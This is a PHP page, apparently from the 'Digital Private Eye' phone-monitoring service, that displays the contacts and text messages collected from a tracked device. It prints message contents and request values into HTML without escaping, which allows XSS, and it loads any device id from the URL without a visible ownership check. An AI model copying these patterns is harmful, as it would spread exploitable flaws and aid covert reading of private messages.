<?php
session_start();
CONST APPLICATION_INITIALS = 'DPEye';
CONST APPLICATION_WEBSITE = 'http://digitalprivateeye.com';
CONST APPLICATION_NAME = 'Digital Private Eye';
CONST APPLICATION_DOWNLOAD_URL = 'https://play.google.com/store/apps/details?id=com.ghostservice';
CONST OWNER = 'Made Software Ltd';
CONST FACEBOOK_URL = 'https://www.facebook.com/pages/Digital-Private-Eye/703312569701920';
CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";

if(!$_SESSION['user_id']) header("Location: sign-in.php");

$currentPage = $page = 1;      
if(array_key_exists("page", $_GET)) 
    $currentPage = $page = $_GET['page'];
include("logic/Devices.php");

$devicesModel = new Devices();
$deviceId = $_GET['device'];

$deviceInfo =  $devicesModel->getDeviceInfo($deviceId);
$deviceDescription = $deviceInfo['description'];


$textPeople =  $devicesModel->getDeviceTextsPeople($deviceId);
if(array_key_exists('telephone', $_GET)) $telephoneNumber = $_GET['telephone'];
else $telephoneNumber = $textPeople[0]['telephone'];

$limit= true;
if(array_key_exists('no_limit',$_GET)) $limit= false;

$telephoneTexts = $devicesModel->getDeviceTelephoneTexts($deviceId, $telephoneNumber, $limit);

$basePath = "";
if(array_key_exists("REQUEST_URL", $_SERVER)) $basePath = $_SERVER['REQUEST_URL'];
$currentUrl = $basePath . "?device=". $deviceId;
$noLimitUrl = basename($_SERVER['REQUEST_URI'])."&no_limit=1";


?>

<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/html">
  <head>
    <title>Device Texts- <?=APPLICATION_NAME;?>- <?=$deviceDescription?></title>
    <?php include("partials/common-head.php");?>
  </head>
  <body>
  <?php
  include "nav.php";
  ?>
  <div class="clear"></div>
    
    <div class="container-wrapper container-top">
      <div class="container container-top">
        <div class="row">
          <div class="col-md-12 center">
            <h1>Text Messages Of <?=$deviceDescription?></h1>
          </div>
        </div><!-- end row -->
      </div><!-- end container -->
    </div><!-- end container wrapper -->

  <?php $deviceId = $_GET['device'];?>
    <div class="container">
      <?php $classicUrl = str_replace("device-texts", "device-texts-classic", basename($_SERVER['REQUEST_URI'])); ?>
      <div  style="text-align: center; font-size: 12px;"><a href="<?=$classicUrl;?>" onclick='showLoadingDiv()'>View texts in classic mode</a></br></br></div>
      <div class="row">
        <?php include("partials/device-nav.php");?>
        <div class="col-md-2" style="background-color: rgba(241,241,192,0); padding-right: 20%; border: 0px;">

            <div class="table-responsive" style="border: 0px;  ">
                <table   border="0" >
                    <tr>
                        <td style='padding-top:10px; word-wrap:break-word;'><strong></strong></td>
                    </tr>
                    <?php
                    if(!$textPeople) echo "<tr><td> No data to display</td></tr>";
                    else
                    {
                        foreach($textPeople as $person)
                        {
                            $personTelephone = $person['telephone'];
                            $lastTextDate = $person['text_date'];
                            $url = $currentUrl."&telephone=". $personTelephone;
                            if((strstr($telephoneNumber, $personTelephone))&& ($personTelephone!="0")) $buttonColor = "btn-purple";
                            else $buttonColor = "btn-white";
                            $name = $person['name'];
                            if(!$name) $name = $personTelephone; //If there is no associated contact name, display the telephone number.
                            echo "<tr>
                                    <td style='padding-right:10px;'>
                                        <a href=\"$url\" class=\"btn btn-md $buttonColor\" style=' font-size: 16px; width: 180px;' onclick='showLoadingDiv()'>$name</br>
                                            <span style='font-size: 10px;'>
                                                <script>
                                                    var localTime = new Date($lastTextDate);
                                                    document.write(localTime.toString().substring(0,25));
                                                </script>
                                            </span>
                                        </a>
                                    </td>
                                  </tr>";
                        }
                    }
                    ?>
                </table>
            </div>

        </div>
          <div class="col-md-6" style="border: 0px #cccccc solid; padding: 15px 15px 15px 15px;">

              <div class="table-responsive" style="width: 100%; border: 0px;">
                  <table  border="0">
                      <?php
                      if(!$telephoneTexts) echo "<tr><td> No data to display</td></tr>";
                      else
                      {
                      }
                      foreach($telephoneTexts as $text)
                      {
                          $textType = $text['messageType'];
                          if ($textType ==1) {
                              //$textAlign = "left";
                              $textColor = "#7C27CB";
                              $backgroundColor = "#ececec";
                          }
                          else if($textType ==2) {
                              //$textAlign = "right";
                              $textColor = "green";
                              $backgroundColor = "#fbfbfb";
                          }
                          $date = $text['date'];
                          $textAlign = "left";
                          $message = $text['message'];
                          $messageDifferential = 100 - strlen($message);
                          $message = $message . "</br>";
                          for($i=1;$i<=$messageDifferential;$i++)
                          {
                              $message = $message . "&nbsp";
                          }

                          if(($textType ==1)||($textType ==2))
                              echo "<tr>
                                    <td  >
                                        <div style='min-width: 300px; width: 100%; text-align: right; float: $textAlign; color: $textColor;
                                         border: 1px #ccc solid; border-radius: 5px; background-color: $backgroundColor;
                                         margin: 5px 0px 5px 0px ; padding: 20px 15px 20px 15px ;font-size: 14px;'>
                                            $message </br>
                                            <span style='font-size: 8px;'>
                                                <script>
                                                    var localTime = new Date($date);
                                                    document.write(localTime.toString().substring(0,25));
                                                </script>
                                            </span>
                                        </div>
                                    </td>
                                  </tr>";
                      }
                      if ($limit==true)echo " <tr><td style='text-align: center;'><div id='more'></br><a href=\"$noLimitUrl#more\" class=\"btn btn-md $buttonColor\">More .. . &nbsp; .</a></div></td></tr>";
                      else echo " <tr><td style='text-align: center; font-style: italic; font-size: 10px;'><div id='more'></br>End of messages</div></td></tr>";
                      ?>

                  </table>
              </div>
          </div>

          </div><!-- end row -->
      </div><!-- end row -->
    </div><!-- end container -->

    <div class="clear"></div>
    <?php
    include "footer.php";
    ?>

    <!-- Le javascript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    
    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/zion.js"></script>
    <script type="text/javascript">
      
        $(document).ready(function(){
          $("body").scrollspy({target: ".bs-docs-nav-wrapper", offset:50});
        });
      
    </script>

  </body>
</html>
